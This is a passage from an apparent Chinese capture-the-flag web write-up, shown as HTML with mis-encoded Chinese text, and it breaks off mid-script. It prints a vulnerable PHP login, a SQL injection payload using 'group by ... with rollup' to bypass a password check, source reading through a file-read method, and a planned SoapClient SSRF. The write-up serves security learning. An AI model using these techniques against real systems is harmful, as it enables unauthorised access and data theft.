&lt;/code>&lt;/pre>&lt;p>ä¹‹å‰çœŸæ²¡è§è¿‡è¿™ç§æ³¨å…¥æ–¹å¼â€¦â€¦ æŸ¥äº†wpåŽçŸ¥é“è¿™æ˜¯&lt;a href="https://www.cnblogs.com/caizhiren/p/7841318.html">å®žéªŒå§3.å› ç¼ºæ€æ±€çš„ç»•è¿‡&lt;/a>ï¼Œé‚£é“é¢˜çš„æºç å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uname&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// ä¸¤ä¸ªå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;form action=&amp;#34;&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input name=&amp;#34;uname&amp;#34; type=&amp;#34;text&amp;#34;/&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input name=&amp;#34;pwd&amp;#34; type=&amp;#34;text&amp;#34;/&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input type=&amp;#34;submit&amp;#34; /&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/form&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;!--source: source.txt--&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">AttackFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrKey&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ArrReq&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ArrReq&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/is&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;æ°´å¯è½½èˆŸï¼Œäº¦å¯èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">AttackFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$filter&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è¿‡æ»¤å­—ç¬¦
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Could not connect: &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">mysql_error&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">mysql_select_db&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SELECT * FROM interest WHERE uname = &amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uname&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// unameå¯æŽ§
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mysql_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å¦‚æžœåªæŸ¥å‡ºæ¥ä¸€è¡Œæ•°æ®
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_fetch_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ¯”å¯¹passwd
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;CTF{XXXXXX}&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;äº¦å¯èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ•°æ®å¤šäºŽä¸€è¡Œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;ä¸€é¢—èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">mysql_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åˆ†æžå†™è¿›åŽ»äº†ï¼Œå®ƒæœ‰ä¸€ä¸ªæ•°æ®æ˜¯å¦ä¸º1è¡Œçš„åˆ¤æ–­ï¼Œè¯´æ˜Žç”¨æˆ·ä¸æ­¢ä¸€ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;code>limit 1 offset x&lt;/code>æ¥åˆ¤æ–­äººæ•°ï¼›ç¬¬ä¸‰ä¸ªè¿‡æ»¤éœ€è¦è¾“å…¥çš„å¯†ç å’Œæ•°æ®åº“ä¸­çš„ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨&lt;code>group by pwd with rollup&lt;/code>è¯­å¥ï¼Œåˆ†ç»„åŽä¼šå¤šä¸€è¡Œç»Ÿè®¡ï¼Œåœ¨groupåˆ†ç»„å­—æ®µçš„åŸºç¡€ä¸Šå†ç»Ÿè®¡æ•°æ®ï¼Œä¼šå‡ºçŽ°è¿™æ ·çš„æ•ˆæžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211102738054.png" alt="image-20211211102738054">&lt;/p>
&lt;p>ä¼šå‡ºçŽ°ä¸€ä¸ªNULLï¼ˆæœ€åŽçš„æ€»æ•°æ®è¿˜ä¼šå¤šä¸€ä¸ªNULLï¼‰ï¼Œæ„Ÿè§‰å¾ˆç±»ä¼¼è”åˆæŸ¥è¯¢çš„æ—¶å€™å‡­ç©ºå¤šä¸€ç»„æ•°æ®ï¼›æˆ‘ä»¬å°±éœ€è¦è¿™ä¸ªpass=nullçš„æ•°æ®ï¼Œç”¨&lt;code>having passwd is NULL&lt;/code>ï¼›ä»¥ä¸‹æ˜¯æœ¬é¢˜çš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>1'or '1'='1' group by passwd with rollup having passwd is NULL#
&lt;/code>&lt;/pre>&lt;p>ç©ºå¯†ç å³å¯æˆåŠŸç™»å…¥&lt;/p>
&lt;p>æ‰«ç›®å½•æœ‰ä¸€ä¸ª&lt;code>wsdl.php&lt;/code>ï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰çš„SoapClientï¼Œè¿˜æç¤ºäº†è¿™äº›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211103657986.png" alt="image-20211211103657986">&lt;/p>
&lt;p>Service.phpå’ŒInterface.phpéƒ½è¯»ä¸åˆ°ï¼Œé‚£åªèƒ½è¯»å‰©ä¸‹çš„ä¸€äº›methodäº†ï¼ŒæŽ¥åœ¨/index.php?method=åŽé¢çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211103814401.png" alt="image-20211211103814401">&lt;/p>
&lt;p>è¿˜æœ‰/index.php?method=get_flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211104700711.png" alt="image-20211211104700711">&lt;/p>
&lt;p>å†ç»“åˆä¸Šé¢çš„SoapClientï¼Œè‚¯å®šæ˜¯è¦ååºåˆ—åŒ–SoapClient+SSRFäº†&lt;/p>
&lt;p>è¿˜æœ‰/index.php?method=File_readï¼Œå¯ä»¥æŽ¥ä¸€ä¸ªPOSTå‚æ•°filenameï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹æºç &lt;/p>
&lt;p>index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ob_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encode.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Service.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">//error_reporting(0);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">//phpinfo();
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">//echo 1231;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$allow_method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;File_read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$allow_method&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;not allow method&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;File_read&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$param&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$param2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$param2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;passwd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;method can use&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$newclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Service&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$newclass&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$param2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ob_flush&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯»ä¸€ä¸‹Service.phpæ²¡æƒé™ï¼Œè¯»encode.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">en_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$swpuctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$varch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$varch&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#75af00">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">})&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">}))&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰ä¸ªKeyï¼Œæˆ‘ä»¬è¯»keyaaaaaaaasdfsaf.txtå¾—åˆ°&lt;code>flag{this_is_false_flag}&lt;/code>ï¼Œåº”è¯¥è¿™ä¸ªå°±æ˜¯keyï¼›æžä¸€ä¸ªå¯¹åº”çš„è§£å¯†è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">de_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
